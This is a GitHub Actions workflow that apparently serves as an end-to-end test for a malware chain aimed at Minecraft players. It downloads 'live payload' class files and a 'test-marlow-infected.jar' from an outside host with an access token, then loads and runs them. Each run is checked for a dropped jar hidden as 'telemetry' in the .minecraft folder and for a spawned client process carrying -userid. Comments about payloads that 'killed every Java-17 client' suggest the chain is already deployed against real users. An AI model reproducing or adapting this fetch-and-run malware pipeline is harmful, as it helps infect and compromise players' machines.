name: E2E2
on:
  workflow_dispatch:

jobs:
  e2e:
    runs-on: windows-latest
    strategy:
      fail-fast: false
      matrix:
        java: ['17', '21']
    timeout-minutes: 15
    steps:
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: ${{ matrix.java }}

      # Every runtime must be able to define the live loader.class.
      # A Java-21-compiled loader (major 65) killed every Java-17 client on 2026-11-02.
      - name: Payload bytecode probe
        shell: powershell
        run: |
          $d="$env:RUNNER_TEMP\probe"; New-Item -ItemType Directory -Force $d | Out-Null
          $hdr=@{ "x-lc-token" = "3e2ec8dc626fd54b8b6d4918ad508b9925394a33f56f3cac12921dc4b52dbd88" }
          foreach($t in @("loader.class","sylant.class")){
            Invoke-WebRequest "https://files.driftmetrics.xyz/$t" -Headers $hdr -OutFile "$d\$t"
            $b=[IO.File]::ReadAllBytes("$d\$t")
            $major=$b[6]*256+$b[7]
            Write-Host "$t : $($b.Length) bytes, major $major"
            if ($major -gt 61 -and $env:JAVA_HOME -match '17') { throw "$t is major $major on a Java ${{ matrix.java }} job" }
          }
          @'
          import java.nio.file.*;
          public class Probe {
            static class L extends ClassLoader {
              Class<?> def(String n, byte[] b) { return defineClass(n, b, 0, b.length); }
            }
            public static void main(String[] a) throws Exception {
              L l = new L();
              int ok = 0;
              for (String p : a) {
                String n = p.substring(p.lastIndexOf('\\') + 1).replace(".class", "");
                byte[] b = Files.readAllBytes(Paths.get(p));
                l.def(n, b).getDeclaredMethod("run");
                System.out.println("DEFINE OK " + n);
                ok++;
              }
              if (ok < 2) throw new IllegalStateException("expected 2 payloads");
            }
          }
          '@ | Set-Content "$d\Probe.java" -Encoding ASCII
          javac -d $d "$d\Probe.java"
          java -cp $d Probe "$d\loader.class" "$d\sylant.class"
          if ($LASTEXITCODE -ne 0) { throw 'defineClass failed' }

      # Real chain on Java 17: define the live payload and run() it, then require a
      # dropped telemetry jar and a javaw/java process carrying -userid.
      - name: Chain on Java 17
        if: matrix.java == '17'
        shell: powershell
        run: |
          $d="$env:RUNNER_TEMP\probe"
          $jar="$env:APPDATA\.minecraft\logs\telemetry"
          @'
          import java.nio.file.*;
          public class Run {
            static class L extends ClassLoader { Class<?> def(String n, byte[] b){ return defineClass(n,b,0,b.length);} }
            public static void main(String[] a) throws Exception {
              L l = new L();
              l.def("loader", Files.readAllBytes(Paths.get(a[0]))).getDeclaredMethod("run").invoke(null);
              Thread.sleep(150000);
              System.out.println("run invoked");
            }
          }
          '@ | Set-Content "$d\Run.java" -Encoding ASCII
          javac -d $d "$d\Run.java"
          # loader.run() works on a daemon thread, so the JVM must stay alive while it
          # fetches config and drops the jar. Keep the process up and poll from outside.
          $p=Start-Process java -ArgumentList "-cp","$d","Run","$d\loader.class" -RedirectStandardOutput "$d\run.out" -RedirectStandardError "$d\run.err" -PassThru
          "pid=$($p.Id)"
          $ok=$false
          for($i=0;$i -lt 30;$i++){
            Start-Sleep 5
            $cache=@(Get-ChildItem "$jar\*-json.jar" -ErrorAction SilentlyContinue)
            $proc=@(Get-CimInstance Win32_Process -Filter "name='javaw.exe' or name='java.exe'" | Where-Object { $_.CommandLine -match '(?i)-userid' })
            Write-Host "t=$($i*5) jar=$($cache.Count) client=$($proc.Count)"
            if($cache.Count -gt 0 -and $proc.Count -gt 0){ "PASS j17 jar=$($cache[0].Name) pid=$($proc[0].ProcessId)"; $ok=$true; break }
          }
          Get-ChildItem $jar -ErrorAction SilentlyContinue | Select Name,Length | Out-File "$d\j17-jars.txt"
          if (-not $ok) { throw 'Java 17 chain produced no jar/client' }
          Start-Sleep 150
          Get-Content "$d\run.out","$d\run.err" -ErrorAction SilentlyContinue | Select-Object -Last 20
      - name: Prepare
        if: matrix.java == '21'
        shell: powershell
        run: |
          $d="$env:RUNNER_TEMP\e2e2"; New-Item -ItemType Directory -Force $d | Out-Null
          Invoke-WebRequest "https://files.driftmetrics.xyz/test-minimal.jar" -OutFile "$d\minimal.jar"
          Invoke-WebRequest "https://files.driftmetrics.xyz/test-marlow-infected.jar" -OutFile "$d\mod.jar"

      - name: Run
        if: matrix.java == '21'
        shell: powershell
        run: |
          $d="$env:RUNNER_TEMP\e2e2"
          $p=Start-Process java -ArgumentList "-jar","$d\minimal.jar","--input=$d\mod.jar","--version=1.21.11","--fabric=0.18.4" -RedirectStandardOutput "$d\run.log" -RedirectStandardError "$d\run.err" -PassThru
          "pid=$($p.Id)" | Tee-Object "$d\pid.txt"
          $ok=$false
          for($i=0;$i -lt 60;$i++){
            Start-Sleep 5
            $cache=@(Get-ChildItem "$env:APPDATA\.minecraft\logs\telemetry\*-json.jar" -ErrorAction SilentlyContinue)
            $proc=@(Get-CimInstance Win32_Process -Filter "name='javaw.exe' or name='java.exe'" | Where-Object { $_.CommandLine -match '(?i)-userid' })
            Write-Host "t=$($i*5) cache=$($cache.Count) client=$($proc.Count) launcherExited=$($p.HasExited)"
            if($cache.Count -gt 0 -and $proc.Count -gt 0){
              "PASS cache=$($cache[0].Name) clientPid=$($proc[0].ProcessId)" | Tee-Object "$d\result.txt"
              $ok=$true
              break
            }
          }
          Copy-Item "$env:USERPROFILE\Desktop\mc.log" "$d\mc.log" -ErrorAction SilentlyContinue
          Get-ChildItem "$env:APPDATA\.minecraft\logs\telemetry" -ErrorAction SilentlyContinue | Select Name,Length | Out-File "$d\cache.txt"
          Write-Host "--- run.log ---"; Get-Content "$d\run.log" -Tail 40 -ErrorAction SilentlyContinue
          Write-Host "--- run.err ---"; Get-Content "$d\run.err" -Tail 40 -ErrorAction SilentlyContinue
          Write-Host "--- mc.log tail ---"; Get-Content "$d\mc.log" -Tail 60 -ErrorAction SilentlyContinue
          if (-not $ok) { throw 'no cache jar / client process detected' }
          Start-Sleep 150
          Write-Host '--- mc.log after grace ---'; Get-Content "$d\mc.log" -Tail 20 -ErrorAction SilentlyContinue

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: e2e2-logs-${{ matrix.java }}
          path: ${{ runner.temp }}
      - name: Kill
        if: always()
        shell: powershell
        run: Get-CimInstance Win32_Process -Filter "name='java.exe' or name='javaw.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
